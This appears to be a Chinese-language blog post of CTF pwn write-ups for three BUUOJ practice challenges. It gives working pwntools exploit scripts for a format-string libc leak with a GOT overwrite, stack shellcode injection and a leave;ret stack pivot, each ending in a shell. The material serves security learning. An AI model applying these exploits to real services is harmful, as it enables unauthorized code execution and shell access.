---
title: Writeup for Second Week
mathjax: true
date: 2021-01-22 11:11:17
tags: pwn
---

## axb_2019_fmt32

32位格式化字符串漏洞，有几个特点需要注意：

1. 测偏移的时候会发现没有完整四位四位的偏移，此时需要在最开始多补一位，这样保证后面都是从8的偏移开始。
2. 用格式化字符串漏洞泄露libc的时候用`%s`，然后第一个4位是got.plt表上的地址，第二个4位才是真正的地址。
3. `fmtstr_payload`填了四个参数，其中注意`numbwritten`参数，意思是格式化字符串中前面已有的字符数。0xa就是`Repeater:A`的位数。
4. 最后劫持了`printf`的got表，填个分号做命令分割，就直接拿shell了。

```python
from pwn import *
from LibcSearcher import LibcSearcher
context.log_level = 'debug'
# p = process('./pwn')
p = remote('node3.buuoj.cn', '26090')
elf = ELF('./pwn')
puts_got = elf.got['puts']
printf_got = elf.got['printf']
read_got = elf.got['read']

# payload = 'XAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p'
payload = b'A' + p32(puts_got) + b'%8$s'
p.sendlineafter('Please tell me:', payload)
p.recvuntil("Repeater:A")
puts_addr = p.recv(8)[-4:]
puts_addr = u32(puts_addr)
log.info(hex(puts_addr))

libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
# log.info(hex(system_addr))
# log.info(hex(binsh_addr))

payload = b'A' + fmtstr_payload(8, {printf_got: system_addr}, write_size='byte', numbwritten=0xa)
p.sendlineafter('Please tell me:', payload)
# 8
p.interactive()
```

## ez_pz_hackover_2016

在当前栈空间外面写shellcode，gdb调出偏移，借助最开始泄露的地址写入shellcode在栈上的地址，就能跳转到栈上的shellcode。

```python
from pwn import *
context.log_level = 'debug'
context.arch = 'i386'
context.os = 'linux'
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
p = process('./pwn')
# p = remote('node3.buuoj.cn', '28529')
elf = ELF('./pwn')

p.recvuntil('Yippie, lets crash: ')
buf = p.recvline().strip()
base_addr = int(buf, 16)
shellcode = asm(shellcraft.sh())
# print(len(shellcode))
# gdb.attach(p)
payload = b'crashme\x00' + b'A' * (0x16 - 0x8 + 0x4) + p32(base_addr - 0x1c) + shellcode
p.sendline(payload)
p.interactive()
```

## ciscn_2019_es_2

0x28的栈溢出只能输入0x30，这时候要用到栈劫持，新的知识点。

大体思路就是先通过一个`leave`然后`ret`的gadget强行把栈缩小，然后我们就在当前部分的栈帧里去布置就可以了。

直接粘核心exp：

```python
ebp_addr = u32(p.recv(4))
str_addr = ebp_addr - 0x38

payload = b'aaaa' + p32(system_addr) + p32(0xdeadbeef) + p32(str_addr + 0x10) + b'/bin/sh\x00'
payload = payload.ljust(0x28, b'\x00')
payload += p32(str_addr) + p32(leave_ret)
```

这个payload的构造挺巧妙的，稍微分析下：

最后的0x8个字节用字符串起始地址覆盖了ebp，后面紧接着`leave`和`ret`，`leave`的时候直接调到字符串其实地址，`ret`的时候从`aaaa`跳到后面的system函数地址。system参数，同样是用在栈上写字符串的方法解决的。

